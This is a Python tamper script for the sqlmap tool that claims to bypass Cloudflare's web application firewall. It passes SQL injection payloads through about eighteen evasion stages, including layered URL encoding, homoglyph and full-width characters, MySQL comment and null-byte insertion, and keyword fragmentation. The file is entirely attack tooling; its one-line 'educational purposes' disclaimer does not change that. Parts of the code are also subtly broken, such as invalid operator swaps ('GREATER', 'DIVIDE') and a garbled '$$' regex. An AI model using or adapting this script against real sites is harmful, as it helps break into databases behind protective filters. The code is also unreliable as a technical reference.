#!/usr/bin/env python
"""
CloudFlare Ultimate WAF Bypass Tamper Script
Comprehensive evasion techniques collection
Research and educational purposes only
by KL3FT3Z (https://github.com/toxy4ny)
"""

import re
import random
import urllib.parse
import base64
import binascii
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Ultimate CloudFlare WAF bypass using 15+ advanced techniques
    """
    
    if payload:
        # Phase 1: Encoding & Obfuscation
        payload = multi_layer_encoding(payload)
        payload = unicode_normalization_advanced(payload)
        payload = hex_encoding_selective(payload)
        
        # Phase 2: Structure Manipulation
        payload = advanced_comment_insertion(payload)
        payload = keyword_fragmentation_v2(payload)
        payload = nested_function_calls(payload)
        
        # Phase 3: Whitespace & Character Substitution
        payload = advanced_whitespace_substitution(payload)
        payload = character_width_manipulation(payload)
        payload = invisible_chars_insertion(payload)
        
        # Phase 4: SQL Syntax Manipulation
        payload = operator_alternatives(payload)
        payload = conditional_logic_wrapping(payload)
        payload = subquery_nesting(payload)
        
        # Phase 5: Advanced Evasion
        payload = json_xpath_injection(payload)
        payload = scientific_notation_numbers(payload)
        payload = charset_confusion(payload)
        
        # Phase 6: Final Obfuscation
        payload = dynamic_case_mutation(payload)
        payload = redundant_parentheses(payload)
        payload = null_byte_insertion(payload)

    return payload

def multi_layer_encoding(payload):
    """
    Multiple encoding layers with selective application
    """
    # Dictionary for smart encoding decisions
    encoding_targets = {
        "'": ["%27", "%2527", "%252527", "%u0027", "\\x27"],
        '"': ["%22", "%2522", "%252522", "%u0022", "\\x22"],
        " ": ["%20", "%2520", "%252520", "+", "%09", "%0a", "%0d"],
        "(": ["%28", "%2528", "%u0028", "\\x28"],
        ")": ["%29", "%2529", "%u0029", "\\x29"],
        "=": ["%3d", "%253d", "%u003d", "\\x3d"],
        "<": ["%3c", "%253c", "%u003c", "\\x3c", "&lt;"],
        ">": ["%3e", "%253e", "%u003e", "\\x3e", "&gt;"],
        "&": ["%26", "%2526", "%u0026", "&amp;"],
        "#": ["%23", "%2523", "%u0023"],
        "\\": ["%5c", "%255c", "%u005c", "\\\\"]
    }
    
    result = ""
    for char in payload:
        if char in encoding_targets and random.choice([True, False, False]):  # 33% chance
            result += random.choice(encoding_targets[char])
        else:
            result += char
    
    return result

def unicode_normalization_advanced(payload):
    """
    Advanced Unicode normalization bypass with homoglyphs
    """
    # Extended Unicode alternatives including homoglyphs
    unicode_alternatives = {
        'a': ['a', 'а', 'ạ', 'ȧ', 'ā', 'ă', 'ą', 'ä'],  # Latin + Cyrillic + accented
        'e': ['e', 'е', 'ė', 'ē', 'ĕ', 'ę', 'ë'],
        'i': ['i', 'і', 'ı', 'ì', 'í', 'î', 'ï', 'ī'],
        'o': ['o', 'о', 'ō', 'ŏ', 'ő', 'ơ', 'ö', 'ò'],
        'u': ['u', 'υ', 'ū', 'ŭ', 'ů', 'ű', 'ų', 'ü'],
        'n': ['n', 'п', 'ñ', 'ń', 'ň', 'ņ', 'ŋ'],
        'r': ['r', 'г', 'ŕ', 'ř', 'ŗ', 'ȑ', 'ȓ'],
        's': ['s', 'ѕ', 'ś', 'š', 'ş', 'ș', 'ș'],
        't': ['t', 'т', 'ţ', 'ț', 'ť', 'ŧ'],
        'p': ['p', 'р', 'ṗ', 'ṕ'],
        'c': ['c', 'с', 'ć', 'č', 'ç', 'ċ', 'ĉ'],
        'x': ['x', 'х', 'ẋ', 'ẍ'],
        'y': ['y', 'у', 'ý', 'ÿ', 'ŷ', 'ẏ']
    }
    
    result = ""
    for char in payload.lower():
        if char in unicode_alternatives and random.choice([True, False, False, False]):  # 25% chance
            result += random.choice(unicode_alternatives[char])
        else:
            result += payload[len(result)] if len(result) < len(payload) else char
    
    return result

def hex_encoding_selective(payload):
    """
    Selective hexadecimal encoding for specific characters
    """
    hex_targets = ["'", '"', "<", ">", "&", "=", " "]
    
    result = ""
    for char in payload:
        if char in hex_targets and random.choice([True, False]):
            # Mix different hex encoding formats
            formats = [
                f"\\x{ord(char):02x}",           # \x27
                f"\\u{ord(char):04x}",           # \u0027
                f"\\U{ord(char):08x}",           # \U00000027  
                f"&#x{ord(char):x};",            # &#x27;
                f"&#{ord(char)};",               # &#39;
                f"%{ord(char):02x}",             # %27
                f"%u{ord(char):04x}"             # %u0027
            ]
            result += random.choice(formats)
        else:
            result += char
    
    return result

def advanced_comment_insertion(payload):
    """
    Advanced SQL comment insertion with various formats
    """
    comment_types = [
        "/**/", "/*!*/", "/*! */", "/*!00000*/", "/*!12345*/",
        "/*!50000*/", "/*!50001*/", "/*!99999*/",
        "/*#*/", "/*--*/", "/*;*/", "/**_**/",
        "/*\x00*/", "/*\n*/", "/*\t*/", "/*\r*/",
        "/*\x0b*/", "/*\x0c*/", "/*\x0d*/", "/*\x08*/",
        "-- ", "-- -", "--+", "--/*", "#", ";%00"
    ]
    
    # Insert comments at strategic positions
    sql_keywords = [
        'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR', 'ORDER', 'BY',
        'GROUP', 'HAVING', 'INSERT', 'UPDATE', 'DELETE', 'JOIN', 'LIMIT',
        'OFFSET', 'CASE', 'WHEN', 'THEN', 'ELSE', 'END', 'AS', 'LIKE',
        'BETWEEN', 'IN', 'EXISTS', 'ALL', 'ANY', 'SOME'
    ]
    
    for keyword in sql_keywords:
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        if pattern.search(payload):
            comment = random.choice(comment_types)
            # Insert comment in different positions
            positions = ['before', 'middle', 'after']
            position = random.choice(positions)
            
            if position == 'before':
                replacement = f"{comment}{keyword}"
            elif position == 'middle' and len(keyword) > 2:
                mid = len(keyword) // 2
                replacement = f"{keyword[:mid]}{comment}{keyword[mid:]}"
            else:
                replacement = f"{keyword}{comment}"
            
            payload = pattern.sub(replacement, payload, count=1)
    
    return payload

def keyword_fragmentation_v2(payload):
    """
    Advanced keyword fragmentation with multiple insertion points
    """
    # Extended fragmentation patterns
    fragments = [
        "/**/", "/*!*/", "/*! */", "/*!12345*/", "/*!50000*/",
        "%00", "%0a", "%0d", "%09", "%20",
        "\x00", "\n", "\r", "\t", " ",
        "+", "-", "*", "/", "%",
        "||", "&&", "^^", "~~"
    ]
    
    # Target functions and keywords for fragmentation
    targets = [
        'CONCAT', 'SUBSTRING', 'LENGTH', 'ASCII', 'CHAR', 'ORD',
        'DATABASE', 'VERSION', 'USER', 'SCHEMA', 'TABLE_NAME',
        'COLUMN_NAME', 'INFORMATION_SCHEMA', 'CURRENT_USER',
        'SESSION_USER', 'SYSTEM_USER', 'LOAD_FILE', 'INTO',
        'OUTFILE', 'DUMPFILE', 'BENCHMARK', 'SLEEP', 'DELAY'
    ]
    
    for target in targets:
        if target.upper() in payload.upper():
            # Multiple fragmentation points
            for i in range(1, len(target)):
                fragment = random.choice(fragments)
                fragmented = target[:i] + fragment + target[i:]
                payload = re.sub(
                    re.escape(target), 
                    fragmented, 
                    payload, 
                    flags=re.IGNORECASE, 
                    count=1
                )
                break  # Only fragment once per target
    
    return payload

def nested_function_calls(payload):
    """
    Wrap SQL functions in nested calls to obfuscate
    """
    function_wrappers = {
        'CONCAT': lambda x: f"CONCAT({x})",
        'CHAR': lambda x: f"CHAR({x})",
        'ASCII': lambda x: f"ASCII({x})",
        'LENGTH': lambda x: f"LENGTH({x})",
        'SUBSTRING': lambda x: f"SUBSTRING({x})",
        'REVERSE': lambda x: f"REVERSE({x})",
        'UPPER': lambda x: f"UPPER({x})",
        'LOWER': lambda x: f"LOWER({x})",
        'HEX': lambda x: f"HEX({x})",
        'UNHEX': lambda x: f"UNHEX({x})"
    }
    
    # Look for simple string literals to wrap
    string_pattern = r"'([^']+)'"
    matches = re.finditer(string_pattern, payload)
    
    for match in matches:
        original = match.group(0)
        content = match.group(1)
        
        if random.choice([True, False]) and len(content) < 20:
            # Choose random wrapper function
            wrapper_name = random.choice(list(function_wrappers.keys()))
            
            # Convert string to ASCII values for CHAR function
            if wrapper_name == 'CHAR':
                ascii_values = ','.join([str(ord(c)) for c in content])
                wrapped = f"CHAR({ascii_values})"
            else:
                wrapped = function_wrappers[wrapper_name](original)
            
            payload = payload.replace(original, wrapped, 1)
    
    return payload

def advanced_whitespace_substitution(payload):
    """
    Advanced whitespace character substitution
    """
    whitespace_alternatives = [
        '\x09',     # Tab
        '\x0a',     # Line Feed
        '\x0b',     # Vertical Tab  
        '\x0c',     # Form Feed
        '\x0d',     # Carriage Return
        '\x20',     # Space
        '\xa0',     # Non-breaking space
        '\u2000',   # En quad
        '\u2001',   # Em quad
        '\u2002',   # En space
        '\u2003',   # Em space
        '\u2004',   # Three-per-em space
        '\u2005',   # Four-per-em space
        '\u2006',   # Six-per-em space
        '\u2007',   # Figure space
        '\u2008',   # Punctuation space
        '\u2009',   # Thin space
        '\u200a',   # Hair space
        '\u3000',   # Ideographic space
        '/**/',     # Comment as whitespace
        '/*!*/',    # MySQL comment
        '+',        # Plus in some contexts
        '%20',      # URL encoded space
        '%09',      # URL encoded tab
        '%0a',      # URL encoded newline
    ]
    
    # Replace spaces with alternatives (not all, to maintain readability)
    words = payload.split(' ')
    if len(words) > 1:
        result = []
        for i, word in enumerate(words):
            result.append(word)
            if i < len(words) - 1:  # Not the last word
                if random.choice([True, False, False]):  # 33% chance
                    result.append(random.choice(whitespace_alternatives))
                else:
                    result.append(' ')
        payload = ''.join(result)
    
    return payload

def character_width_manipulation(payload):
    """
    Use full-width and half-width character variations
    """
    # Full-width alternatives for ASCII characters
    fullwidth_map = {
        '!': '！', '"': '＂', '#': '＃', '$': '＄', '%': '％',
        '&': '＆', "'": '＇', '(': '（', ')': '）', '*': '＊',
        '+': '＋', ',': '，', '-': '－', '.': '．', '/': '／',
        '0': '０', '1': '１', '2': '２', '3': '３', '4': '４',
        '5': '５', '6': '６', '7': '７', '8': '８', '9': '９',
        ':': '：', ';': '；', '<': '＜', '=': '＝', '>': '＞',
        '?': '？', '@': '＠', '[': '［', '\\': '＼', ']': '］',
        '^': '＾', '_': '＿', '`': '｀', '{': '｛', '|': '｜',
        '}': '｝', '~': '～'
    }
    
    result = ""
    for char in payload:
        if char in fullwidth_map and random.choice([True, False, False, False]):  # 25% chance
            result += fullwidth_map[char]
        else:
            result += char
    
    return result

def invisible_chars_insertion(payload):
    """
    Insert invisible Unicode characters
    """
    invisible_chars = [
        '\u200b',  # Zero Width Space
        '\u200c',  # Zero Width Non-Joiner  
        '\u200d',  # Zero Width Joiner
        '\u2060',  # Word Joiner
        '\ufeff',  # Zero Width No-Break Space
        '\u034f',  # Combining Grapheme Joiner
        '\u2028',  # Line Separator
        '\u2029',  # Paragraph Separator
        '\u061c'   # Arabic Letter Mark
    ]
    
    # Insert invisible characters at random positions
    result = ""
    for i, char in enumerate(payload):
        result += char
        # 10% chance to insert invisible character after each character
        if random.choice([True] + [False] * 9):
            result += random.choice(invisible_chars)
    
    return result

def operator_alternatives(payload):
    """
    Replace operators with alternatives
    """
    operator_alternatives = {
        '=': ['=', 'LIKE', 'REGEXP', 'RLIKE'],
        'AND': ['AND', '&&', '%26%26'],
        'OR': ['OR', '||', '%7C%7C'],
        'NOT': ['NOT', '!', '%21'],
        '>': ['>', 'GREATER'],
        '<': ['<', 'LESS'],
        '>=': ['>=', 'NOT<'],
        '<=': ['<=', 'NOT>'],
        '!=': ['!=', '<>', 'NOT ='],
        '+': ['+', 'ADD'],
        '-': ['-', 'SUBTRACT'],
        '*': ['*', 'MULTIPLY'],
        '/': ['/', 'DIVIDE']
    }
    
    for op, alternatives in operator_alternatives.items():
        if op in payload and len(alternatives) > 1:
            alternative = random.choice(alternatives[1:])  # Skip first (original)
            payload = payload.replace(op, alternative, 1)
    
    return payload

def conditional_logic_wrapping(payload):
    """
    Wrap parts of payload in conditional logic
    """
    conditions = [
        "CASE WHEN 1=1 THEN {} ELSE 0 END",
        "IF(1=1,{},0)",
        "IFNULL({},0)",
        "NULLIF(0,{})*0+{}",
        "COALESCE({},0)",
        "(CASE WHEN 1=1 THEN {} END)",
        "IIF(1=1,{},0)",
        "CHOOSE(1,{})",
        "DECODE(1,1,{},0)"
    ]
    
    # Look for numeric values to wrap
    numeric_pattern = r'\b(\d+)\b'
    matches = list(re.finditer(numeric_pattern, payload))
    
    if matches and random.choice([True, False]):
        match = random.choice(matches)
        number = match.group(1)
        condition = random.choice(conditions)
        
        if '{}' in condition:
            if condition.count('{}') == 2:
                wrapped = condition.format(number, number)
            else:
                wrapped = condition.format(number)
            payload = payload[:match.start()] + wrapped + payload[match.end():]
    
    return payload

def subquery_nesting(payload):
    """
    Wrap parts in subqueries for obfuscation
    """
    # Simple subquery wrappers
    subquery_wrappers = [
        "SELECT * FROM (SELECT {}) AS t",
        "(SELECT {} FROM DUAL)",
        "(SELECT TOP 1 {} FROM (SELECT 1) t)",
        "SELECT {} FROM (VALUES (1)) AS t(c)",
        "(SELECT {} UNION SELECT {} LIMIT 1)"
    ]
    
    # Only apply to simple SELECT statements
    if payload.upper().startswith('SELECT') and 'FROM' not in payload.upper():
        wrapper = random.choice(subquery_wrappers)
        if wrapper.count('{}') == 2:
            payload = wrapper.format(payload, payload)
        else:
            payload = wrapper.format(payload)
    
    return payload

def json_xpath_injection(payload):
    """
    Wrap payload in JSON/XML functions when applicable
    """
    json_functions = [
        "JSON_EXTRACT('{{\"a\":\"{}\"}}','$.a')",
        "JSON_UNQUOTE(JSON_EXTRACT('{{\"test\":\"{}\"}}','$.test'))",
        "JSON_VALUE('{{\"key\":\"{}\"}}','$.key')",
        "EXTRACTVALUE('<root><item>{}</item></root>','/root/item')",
        "XPATH('//item/text()',XMLPARSE(CONTENT '<item>{}</item>'))"
    ]
    
    # Apply to string literals
    string_pattern = r"'([^']{1,20})'"
    match = re.search(string_pattern, payload)
    
    if match and random.choice([True, False, False]):  # 33% chance
        original = match.group(0)
        content = match.group(1)
        json_func = random.choice(json_functions)
        wrapped = json_func.format(content)
        payload = payload.replace(original, wrapped, 1)
    
    return payload

def scientific_notation_numbers(payload):
    """
    Convert numbers to scientific notation
    """
    def to_scientific(match):
        num = int(match.group(0))
        if num == 0:
            return "0e0"
        elif num == 1:
            return "1e0"
        elif num < 10:
            return f"{num}e0"
        else:
            # Convert to scientific notation
            exp = len(str(num)) - 1
            mantissa = num / (10 ** exp)
            return f"{mantissa}e{exp}"
    
    # Apply to integers only (avoid breaking existing decimals)
    payload = re.sub(r'\b\d{2,}\b', to_scientific, payload)
    return payload

def charset_confusion(payload):
    """
    Mix different character sets for the same logical characters
    """
    # Mix Latin, Cyrillic, Greek, and other similar-looking characters
    char_confusions = {
        'a': ['a', 'а', 'α'],  # Latin, Cyrillic, Greek
        'e': ['e', 'е', 'ε'], 
        'o': ['o', 'о', 'ο'],
        'p': ['p', 'р', 'ρ'],
        'c': ['c', 'с', 'ϲ'],
        'x': ['x', 'х', 'χ'],
        'y': ['y', 'у', 'γ'],
        'i': ['i', 'і', 'ι'],
        'n': ['n', 'п', 'η'],
        'u': ['u', 'υ', 'μ'],
        'k': ['k', 'κ', 'ķ'],
        'h': ['h', 'н', 'η'],
        'm': ['m', 'м', 'μ'],
        't': ['t', 'т', 'τ'],
        'b': ['b', 'в', 'β']
    }
    
    result = ""
    for char in payload.lower():
        if char in char_confusions and random.choice([True, False, False, False]):  # 25%
            result += random.choice(char_confusions[char])
        else:
            result += payload[len(result)] if len(result) < len(payload) else char
    
    return result

def dynamic_case_mutation(payload):
    """
    Dynamic case variation with pattern mixing
    """
    # Different case patterns
    patterns = [
        lambda s: s.lower(),                    # all lowercase
        lambda s: s.upper(),                    # all uppercase  
        lambda s: s.capitalize(),               # first letter uppercase
        lambda s: ''.join([c.upper() if i % 2 == 0 else c.lower() 
                          for i, c in enumerate(s)]),  # alternating
        lambda s: ''.join([c.upper() if random.choice([True, False]) else c.lower() 
                          for c in s]),         # random case
        lambda s: s.swapcase(),                 # swap case
    ]
    
    # Apply different patterns to different SQL keywords
    sql_keywords = re.findall(r'\b(SELECT|FROM|WHERE|UNION|AND|OR|ORDER|BY|GROUP|HAVING|INSERT|UPDATE|DELETE|JOIN|LIKE|IN|BETWEEN|IS|NULL|CASE|WHEN|THEN|ELSE|END)\b', payload, re.IGNORECASE)
    
    for keyword in set(sql_keywords):
        if keyword.upper() in payload.upper():
            pattern = random.choice(patterns)
            mutated = pattern(keyword)
            payload = re.sub(re.escape(keyword), mutated, payload, flags=re.IGNORECASE, count=1)
    
    return payload

def redundant_parentheses(payload):
    """
    Add redundant parentheses for obfuscation
    """
    # Add parentheses around expressions
    expressions = [
        r'\b(\d+\s*[+\-*/]\s*\d+)\b',          # Math expressions
        r'\b([\w\.]+\s*=\s*[\w\'"]+)\b',        # Comparisons
        r'\b(\w+\s+LIKE\s+\'\%\w+\%\')\b',     # LIKE expressions
        r'\b(\w+\s+IN\s*$$[^)]+$$)\b',         # IN expressions
    ]
    
    for pattern in expressions:
        matches = re.finditer(pattern, payload, re.IGNORECASE)
        for match in matches:
            original = match.group(0)
            wrapped = f"({original})"
            payload = payload.replace(original, wrapped, 1)
            break  # Only wrap one per pattern
    
    return payload

def null_byte_insertion(payload):
    """
    Insert null bytes at strategic positions
    """
    null_variants = ['\x00', '%00', '\\x00', '\\0']
    
    # Insert null bytes after certain characters
    target_chars = ["'", '"', ')', ';', '--']
    
    for char in target_chars:
        if char in payload and random.choice([True, False, False]):  # 33% chance
            null_variant = random.choice(null_variants)
            payload = payload.replace(char, char + null_variant, 1)
    
    return payload
